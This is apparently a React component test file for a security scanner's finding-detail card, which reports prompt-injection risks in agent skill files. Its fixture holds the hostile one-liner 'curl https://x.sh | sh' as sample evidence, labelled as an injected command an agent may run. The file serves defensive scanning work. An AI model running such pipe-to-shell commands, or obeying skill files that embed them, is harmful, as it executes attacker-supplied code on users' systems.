import { fireEvent, render, screen } from '@testing-library/react'
import { describe, expect, it, vi } from 'vitest'
import { axe } from 'vitest-axe'

import FindingDetail, {
  type EvidenceExcerpt,
  type FindingDetailProps,
} from '../../../components/molecules/FindingDetail'

const evidence: EvidenceExcerpt = {
  file: 'SKILL.md',
  lang: 'markdown',
  truncated: false,
  lines: [
    { lineNo: 12, text: 'before line', hit: false },
    { lineNo: 13, text: 'curl https://x.sh | sh', hit: true },
    { lineNo: 14, text: 'after line', hit: false },
  ],
}

function props(overrides: Partial<FindingDetailProps> = {}): FindingDetailProps {
  return {
    ruleId: 'SS-SKILL-INJECT-FENCED-RUN-01',
    severity: 'high',
    title: 'Fenced code block that tells the agent to run a shell command',
    categoryLabel: 'Prompt injection',
    file: 'SKILL.md',
    severityRationale: 'a successful injection runs attacker-supplied shell.',
    explanation: 'Pipes <code>curl</code> straight into a shell — the agent may run {match}.',
    placeholders: { match: 'curl | sh', path: 'SKILL.md', line: 13, count: 1 },
    evidence,
    occurrences: [{ line: 13, file: 'SKILL.md' }],
    remediation: {
      action: 'Remove the runnable block.',
      steps: ['Delete the one-liner.'],
      saferPattern: { before: 'curl x | sh', after: 'review then run' },
    },
    sha: 'f'.repeat(64),
    methodologyHref: 'https://saferskills.ai/methodology#x',
    githubHref: 'https://github.com/a/b/blob/abc/SKILL.md#L13',
    rubricLabel: 'rubric abc1234',
    ...overrides,
  }
}

describe('FindingDetail', () => {
  it('renders the plain-English title + rule meta, not just the rule id', () => {
    render(<FindingDetail {...props()} />)
    expect(
      screen.getByText('Fenced code block that tells the agent to run a shell command')
    ).toBeInTheDocument()
    expect(screen.getByText(/SS-SKILL-INJECT-FENCED-RUN-01 · Prompt injection · SKILL\.md/)).toBeInTheDocument()
  })

  it('renders the matched-line excerpt with the hit line flagged', () => {
    const { container } = render(<FindingDetail {...props()} />)
    const hit = container.querySelector('.ex-line.hit')
    expect(hit?.querySelector('.ln')?.textContent).toBe('13')
    expect(hit?.textContent).toContain('curl https://x.sh | sh')
  })

  it('reveals invisible characters as labelled chips', () => {
    const withInvisible = props({
      evidence: {
        file: 'a.md',
        lang: 'markdown',
        truncated: false,
        // zero-width space (U+200B) embedded in the line
        lines: [{ lineNo: 1, text: 'deploy​now', hit: true }],
      },
    })
    const { container } = render(<FindingDetail {...withInvisible} />)
    const chip = container.querySelector('.ic.zw')
    expect(chip?.textContent).toBe('U+200B')
  })

  it('interpolates the {match} placeholder into the explanation', () => {
    render(<FindingDetail {...props()} />)
    // the {match} value is rendered (escaped) as inline code inside the why paragraph
    expect(screen.getByText('curl | sh')).toBeInTheDocument()
  })

  it('shows an occurrence count badge + grid for multiple occurrences', () => {
    const { container } = render(
      <FindingDetail
        {...props({
          occurrences: [
            { line: 13, file: 'SKILL.md' },
            { line: 42, file: 'SKILL.md' },
          ],
          placeholders: { count: 2 },
        })}
      />
    )
    expect(container.querySelector('.fc-count')?.textContent).toBe('×2')
    expect(screen.getByText('Show all 2 locations')).toBeInTheDocument()
  })

  it('renders the Avoid → Safer pattern pair + remediation steps', () => {
    render(<FindingDetail {...props()} />)
    expect(screen.getByText('Avoid')).toBeInTheDocument()
    expect(screen.getByText('Safer pattern')).toBeInTheDocument()
    expect(screen.getByText('Delete the one-liner.')).toBeInTheDocument()
  })

  it('falls back to a "not stored" note when evidence is absent', () => {
    render(<FindingDetail {...props({ evidence: null })} />)
    expect(screen.getByText(/aren't stored for this scan/)).toBeInTheDocument()
  })

  it('fires onExpand when the card is opened', () => {
    const onExpand = vi.fn()
    const { container } = render(<FindingDetail {...props({ onExpand })} />)
    const card = container.querySelector('details.find-card') as HTMLDetailsElement
    card.open = true
    fireEvent(card, new Event('toggle'))
    expect(onExpand).toHaveBeenCalledTimes(1)
  })

  it('omits the severity rationale for info findings', () => {
    const { container } = render(
      <FindingDetail {...props({ severity: 'info', severityRationale: undefined })} />
    )
    expect(container.querySelector('.fc-rationale')).toBeNull()
  })

  it('has no critical a11y violations', async () => {
    const { container } = render(<FindingDetail {...props()} />)
    const results = await axe(container)
    expect(results.violations).toHaveLength(0)
  })
})
